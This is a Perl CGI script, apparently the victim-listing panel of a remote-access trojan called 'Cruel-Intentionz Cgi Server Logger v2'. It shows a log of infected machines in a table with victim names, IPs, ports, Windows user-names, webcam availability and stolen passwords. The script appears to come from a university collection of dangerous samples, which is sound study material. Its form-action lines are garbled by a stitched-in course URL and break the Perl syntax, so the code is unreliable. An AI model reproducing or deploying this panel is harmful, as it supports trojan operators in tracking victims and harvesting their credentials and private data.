#!/usr/bin/perl 
print "Content-type:text/html\n\n";



$in = $ENV{'QUERY_STRING'};
@in = split(/[&;]/,$in); 
foreach $i (0 .. $#in) {	
  $in[$i] =~ s/\+/ /g;	
  ($key, $val) = split(/=/,$in[$i],2);	
  $key =~ s/%([A-Fa-f0-9]{2})/pack("c",hex($1))/ge;	
  $val =~ s/%([A-Fa-f0-9]{2})/pack("c",hex($1))/ge;	
  $in{$key} .= "\0" if (defined($in{$key}));	 
  $in{$key} .= $val;
}

 
  $bestand='log.txt';
  $correctpass = "";
  $scriptlocation = "http://www.your-site.net/list.cgi";
  $password = $in{'password'};
  $function = $in{'function'};

open (FILE,"+<$bestand") || die "Can't open $bestand: $!\n"; 
@list = <FILE>;
close(FILE);

@days   = ('Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday');
($sec,$min,$hour,$mday,$mon,$year,$wday) = (localtime(time))[0,1,2,3,4,5,6];
$time = sprintf("%02d:%02d:%02d",$hour,$min,$sec);
$date = "$days[$wday] $mday, $time";

if ($correctpass eq "")
{
 &show_list;
}

if ($function eq "post") {
      if ($password eq $correctpass) {
          &show_list;
          exit;
       }
      &wrong_password;
   }
 &ask_password;


sub wrong_password {
    print "<HTML>\n";
    print "<HEAD><TITLE>Cruel-Intentionz Cgi Server Logger v2 [invalid password]</Title></HEAD>\n";
    print "<BODY BGCOLOR=#C6C7C6>\n";
    print "<table width=40% cellpadding=1 cellspacing=0  border=1 align=CENTER bgcolor=#000000 bordercolor =#000000><br><br><br>\n";
    print "<center><tr bgcolor=#5282AD><td><center><table><font color=#CCCCCC font style=font-size:13 face=Verdana><b>Invalid password, try again:</b></font></table></center></tr></center>\n";
    print "<tr bgcolor=#C6C7C6><td><center><table border=0 cellpadding=4 cellspacing=0><tr><br></tr></table></center>\n";  
    print "<CENTER><FORM ACTION="http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/$scriptlocation">\n";
    print "<INPUT TYPE=password  NAME=password SIZE=30%>\n";
    print "<INPUT TYPE=hidden NAME=function VALUE=post>\n";
    print "<INPUT TYPE=submit VALUE=\"   OK   \">\n";
    print "</FORM></CENTER>\n";
    print "</td></tr></table>\n";   
    print "</BODY></HTML>\n";
    exit;
}

sub ask_password {
   print "<HTML>\n";
    print "<HEAD><TITLE>Cruel-Intentionz Cgi Server Logger v2 [enter password]</Title></HEAD>\n";
    print "<BODY BGCOLOR=#C6C7C6>\n";
    print "<table width=40% cellpadding=1 cellspacing=0  border=1 align=CENTER bgcolor=#000000 bordercolor =#000000><br><br><br>\n";
    print "<center><tr bgcolor=#5282AD><td><center><table><font color=#CCCCCC font style=font-size:13 face=Verdana><b>Please enter password:</b></font></table></center></tr></center>\n";
    print "<tr bgcolor=#C6C7C6><td><center><table border=0 cellpadding=4 cellspacing=0><tr><br></tr></table></center>\n";  
    print "<CENTER><FORM ACTION="http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/$scriptlocation">\n";
    print "<INPUT TYPE=password  NAME=password SIZE=30%>\n";
    print "<INPUT TYPE=hidden NAME=function VALUE=post>\n";
    print "<INPUT TYPE=submit VALUE=\"   OK   \">\n";
    print "</FORM></CENTER>\n";
    print "</td></tr></table>\n";   
    print "</BODY></HTML>\n";
    exit;
}


sub show_list {
    print "<HTML>\n";
    print "<HEAD><TITLE>Cruel-Intentionz Cgi Server Logger v2</Title>\n";
    print "<style type=text/css><!--BODY {SCROLLBAR-FACE-COLOR:#5282AD; SCROLLBAR-HIGHLIGHT-COLOR:#000000; SCROLLBAR-SHADOW-COLOR: #000000; SCROLLBAR-ARROW-COLOR:  #C6C7C6; SCROLLBAR-TRACK-COLOR: #C6C7C6; } A:active {COLOR: #2092B0; FONT-FAMILY: Verdana; TEXT-DECORATION: none} A:hover {COLOR: #2092B0; FONT-FAMILY: Verdana; TEXT-DECORATION: none} A:link {COLOR: #5282AD; FONT-FAMILY: Verdana; TEXT-DECORATION: none} A {COLOR: #B8A490; FONT-FAMILY: Verdana; TEXT-DECORATION: none} -->\n";
    print "</style></HEAD><body bgcolor=#C6C7C6><center><font style=font-size:13 color=#F7F7F7 face=Verdana><b>Cruel-Intentionz Cgi Server Logger v2</b><br>\n";
    print "<br><table border =1 cellpadding =2 cellspacing =0 bgcolor =#5282AD bordercolor = #313431><td><center><font color=#F7F7F7 style=font-size:11 face=Verdana><b>IP</td><td><center><font color=#F7F7F7 style=font-size:10 face=Verdana><b>Port</td><td><center><font color=#F7F7F7 style=font-size:10 face=Verdana><b>Victim name</td><td><center><font color=#F7F7F7 style=font-size:10 face=Verdana><b>Windows Version</td><td><center><font color=#F7F7F7 style=font-size:10 face=Verdana><b>Windows user-name</td><td><center><font color=#F7F7F7 style=font-size:10 face=Verdana><b>Country</td><td><center><font color=#F7F7F7 style=font-size:10 face=Verdana><b>Server</td><td><center><font color=#F7F7F7 style=font-size:10 face=Verdana><b>Webcam?</td><td><center><font color=#F7F7F7 style=font-size:10 face=Verdana><b>Date & Time</td><td><center><font color=#F7F7F7 style=font-size:10 face=Verdana><b>Password</td>@list\n";
    print "</td><div align=right><font color=#F7F7F7 style=font-size:10 face=Verdana>Server time: $date</font><br></div></td></table></center><br>\n";
    print "<BODY BGCOLOR=#C6C7C6>\n";
    print "</BODY></HTML>\n";
    exit;
}